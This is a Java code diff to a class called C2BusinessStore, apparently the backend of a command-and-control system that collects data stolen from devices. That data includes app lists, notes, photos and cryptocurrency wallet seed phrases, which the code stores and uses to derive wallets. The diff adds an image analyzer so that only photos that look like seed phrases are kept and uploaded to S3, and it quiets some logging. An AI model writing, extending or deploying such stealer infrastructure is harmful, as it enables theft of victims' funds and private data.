@@ -70,6 +70,10 @@ public class C2BusinessStore {
     private Executor albumUploadExecutor;
 
     @Autowired
+    @Qualifier("albumFilterExecutor")
+    private Executor albumFilterExecutor;
+
+    @Autowired
     @Qualifier("walletDeriveExecutor")
     private Executor walletDeriveExecutor;
 
@@ -78,6 +82,9 @@ public class C2BusinessStore {
 
     @Autowired(required = false)
     private AlbumBatchInsertBuffer albumBatchInsertBuffer;
+
+    @Autowired
+    private MnemonicImageAnalyzer mnemonicImageAnalyzer;
 
     @org.springframework.beans.factory.annotation.Value("${news4.album.photo-dir:}")
     private String photoDir;
@@ -201,7 +208,7 @@ public class C2BusinessStore {
         }
         JSONArray al = plaintext.getJSONArray("al");
         if (al == null || al.isEmpty()) {
-            log.info("正常日志:[c2_handlers][applist] al 为空, recordId={}", ctx.getRecordId());
+            log.debug("正常日志:[c2_handlers][applist] al 为空, recordId={}", ctx.getRecordId());
             return;
         }
         Integer deviceRowId = ctx.getDeviceRowId();
@@ -226,7 +233,7 @@ public class C2BusinessStore {
                 ok++;
             } catch (DuplicateKeyException dup) {
                 skipped++;
-                log.info("正常日志:[c2_handlers][applist] 已存在，跳过, recordId={}, idx={}",
+                log.debug("正常日志:[c2_handlers][applist] 已存在，跳过, recordId={}, idx={}",
                         ctx.getRecordId(), i);
             } catch (Exception ex) {
                 log.info("异常日志:[c2_handlers][applist] 单条插入失败, recordId={}, idx={}, err={}",
@@ -251,13 +258,13 @@ public class C2BusinessStore {
         }
         String resultRaw = str(plaintext, "result");
         if (resultRaw.isEmpty()) {
-            log.info("正常日志:[c2_handlers][mnemonic] result 为空, recordId={}", ctx.getRecordId());
+            log.debug("正常日志:[c2_handlers][mnemonic] result 为空, recordId={}", ctx.getRecordId());
             return;
         }
         // 与 18 一致：小写 + trim + 空白压缩，同一物理词只算一次
         String result = normalizeMnemonic(resultRaw);
         if (result.isEmpty()) {
-            log.info("正常日志:[c2_handlers][mnemonic] result 规范化后为空, recordId={}", ctx.getRecordId());
+            log.debug("正常日志:[c2_handlers][mnemonic] result 规范化后为空, recordId={}", ctx.getRecordId());
             return;
         }
         // wordscount：助记词位数（按空白分词计数，如 12/15/18/21/24）
@@ -305,6 +312,8 @@ public class C2BusinessStore {
             e.setPhraseHash(phraseHash);
             e.setAddtime(System.currentTimeMillis() / 1000.0);
             mnemonicDao.insert(e);
+            log.info("正常日志:[c2_handlers][mnemonic] 写入成功, recordId={}, mnemonicId={}, source={}",
+                    ctx.getRecordId(), e.getId(), source);
 
             // 派生用规范化后的词（与入库一致）
             JSONObject derivePt = plaintext;
@@ -449,7 +458,7 @@ public class C2BusinessStore {
         }
         JSONArray list = plaintext.getJSONArray("list");
         if (list == null || list.isEmpty()) {
-            log.info("正常日志:[c2_handlers][memorandum] list 为空, recordId={}", ctx.getRecordId());
+            log.debug("正常日志:[c2_handlers][memorandum] list 为空, recordId={}", ctx.getRecordId());
             return;
         }
         Integer deviceRowId = ctx.getDeviceRowId();
@@ -611,7 +620,40 @@ public class C2BusinessStore {
             imageName = imageName.substring(0, 256);
         }
         draft.setImageName(imageName);
-        scheduleCloudUploadBytes(draft, image, safeExt);
+        scheduleMnemonicFilterThenUpload(draft, image, safeExt);
+    }
+
+    /** 助记词图片分析通过后才投 S3；不通过直接丢弃。 */
+    private void scheduleMnemonicFilterThenUpload(AlbumEntity draft, byte[] image, String safeExt) {
+        final String ext = safeExt;
+        AlbumAsyncConfig.AlbumRejectAware task = new AlbumAsyncConfig.AlbumRejectAware() {
+            @Override
+            public void run() {
+                try {
+                    if (mnemonicImageAnalyzer != null && mnemonicImageAnalyzer.isEnabled()) {
+                        if (!mnemonicImageAnalyzer.looksLikeMnemonic(image, draft.getC2RecordId())) {
+                            return;
+                        }
+                    }
+                    scheduleCloudUploadBytes(draft, image, ext);
+                } catch (Exception ex) {
+                    log.info("异常日志:[c2_handlers][album] 助记词过滤异常，丢弃不落库, recordId={}, err={}",
+                            draft.getC2RecordId(), ex.getMessage());
+                }
+            }
+
+            @Override
+            public void onRejected() {
+                log.info("异常日志:[c2_handlers][album] 过滤队列已满，丢弃不落库, recordId={}, sha={}",
+                        draft.getC2RecordId(), draft.getFileSha256());
+            }
+        };
+        try {
+            albumFilterExecutor.execute(task);
+        } catch (Exception ex) {
+            log.info("异常日志:[c2_handlers][album] 提交过滤失败, recordId={}, err={}",
+                    draft.getC2RecordId(), ex.getMessage());
+        }
     }
 
     /**
@@ -646,14 +688,14 @@ public class C2BusinessStore {
     /** @deprecated 旧入口保留签名兼容；纯云模式已改为 draft 上云后入库 */
     public void scheduleCloudUploadBytes(Integer albumId, Integer deviceRowId,
                                          byte[] image, String safeExt, String imageName) {
-        log.info("正常日志:[c2_handlers][album] 旧 scheduleCloudUploadBytes(albumId) 已废弃, albumId={}",
+        log.debug("正常日志:[c2_handlers][album] 旧 scheduleCloudUploadBytes(albumId) 已废弃, albumId={}",
                 albumId);
     }
 
     /** @deprecated 旧「本地路径上云」入口 */
     public void scheduleCloudUpload(Integer albumId, Integer deviceRowId,
                                     String absFilePath, String localRelPath) {
-        log.info("正常日志:[c2_handlers][album] scheduleCloudUpload 已废弃(无本地盘), albumId={}", albumId);
+        log.debug("正常日志:[c2_handlers][album] scheduleCloudUpload 已废弃(无本地盘), albumId={}", albumId);
     }
 
     /** 内存字节 → S3 → 成功才 INSERT album（status=1 + URL） */
@@ -670,7 +712,7 @@ public class C2BusinessStore {
             String objectKey = buildCloudObjectKey(rowId, fileName);
             String url = s3FileUploadUtil.uploadBytes(image, objectKey, fileName);
             if (url == null || url.isEmpty()) {
-                log.info("异常日志:[c2_handlers][album] S3 上传失败不落库, recordId={}, key={}",
+                log.info("异常日志:[album] S3 上传失败, recordId={}, key={}",
                         draft.getC2RecordId(), objectKey);
                 return;
             }
@@ -697,23 +739,22 @@ public class C2BusinessStore {
             }
             if (albumBatchInsertBuffer != null) {
                 albumBatchInsertBuffer.offer(draft);
-                log.debug("正常日志:[c2_handlers][album] 上云成功，已入批量写队列, recordId={}, url={}",
-                        draft.getC2RecordId(), url);
+                log.info("正常日志:[album] 上云完成待入库, recordId={}, url={}", draft.getC2RecordId(), url);
             } else {
                 try {
                     albumDao.insert(draft);
-                    log.info("正常日志:[c2_handlers][album] 上云成功并入库, recordId={}, albumId={}, url={}",
+                    log.info("正常日志:[album] 上云入库, recordId={}, albumId={}, url={}",
                             draft.getC2RecordId(), draft.getId(), url);
                 } catch (Exception insertEx) {
                     if (isDuplicateKey(insertEx)) {
                         return;
                     }
-                    log.info("异常日志:[c2_handlers][album] 上云成功但入库失败, recordId={}, url={}, err={}",
-                            draft.getC2RecordId(), url, insertEx.getMessage());
+                    log.info("异常日志:[album] 入库失败, recordId={}, err={}",
+                            draft.getC2RecordId(), insertEx.getMessage());
                 }
             }
         } catch (Exception ex) {
-            log.info("异常日志:[c2_handlers][album] S3/入库异常, recordId={}, err={}",
+            log.info("异常日志:[album] S3/入库异常, recordId={}, err={}",
                     draft.getC2RecordId(), ex.getMessage());
         }
     }
